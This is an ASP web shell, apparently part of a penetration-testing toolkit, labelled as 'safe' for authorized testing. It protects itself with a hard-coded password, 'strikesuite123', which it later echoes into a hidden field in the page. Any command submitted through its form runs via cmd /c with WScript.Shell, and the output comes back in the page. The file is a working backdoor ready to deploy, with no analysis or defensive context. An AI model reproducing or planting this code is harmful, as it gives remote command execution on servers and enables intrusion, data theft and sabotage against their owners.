<%
' ASP Command Shell
' Safe web shell for authorized testing

Dim password
password = "strikesuite123"

If Request.Form("password") <> password Then
%>
<form method="post">
    <input type="password" name="password" placeholder="Password" required>
    <input type="submit" value="Login">
</form>
<%
    Response.End
End If

If Request.Form("cmd") <> "" Then
    Dim cmd, output
    cmd = Request.Form("cmd")
    output = CreateObject("WScript.Shell").Exec("cmd /c " & cmd).StdOut.ReadAll
    Response.Write("<pre>" & output & "</pre>")
End If
%>

<form method="post">
    <input type="hidden" name="password" value="<%=password%>">
    <input type="text" name="cmd" placeholder="Command" style="width: 80%;" required>
    <input type="submit" value="Execute">
</form>
